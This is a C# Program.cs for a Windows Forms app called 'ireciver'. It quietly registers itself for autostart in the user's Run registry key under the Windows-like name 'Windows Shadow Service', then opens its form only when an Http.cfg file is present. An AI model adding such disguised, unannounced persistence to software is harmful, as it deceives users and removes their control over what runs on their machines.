using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using Microsoft.Win32;
using System.Windows.Forms;

namespace ireciver
{
    static class Program
    {
        static Mutex mutex = new Mutex(true, "{d313c794-d5ab-4d98-9fa1-197ebdb9ff53}");
        static string cfgPath = Path.GetDirectoryName(Application.ExecutablePath) + "\\Http.cfg";
        
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Microsoft.Win32.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows Shadow Service", "\""+ Application.ExecutablePath+ "\"");
            if (File.Exists(cfgPath))
            {
                if (mutex.WaitOne(TimeSpan.Zero, true))
                {
                    try
                    {
                        Application.EnableVisualStyles();
                        Application.SetCompatibleTextRenderingDefault(false);
                        Application.Run(new Form1());
                    }
                    finally
                    {
                        mutex.ReleaseMutex();
                    }
                }
                else
                {
                    MessageBox.Show("An instance of the application is already running.");
                }
            }
        }
    }
}
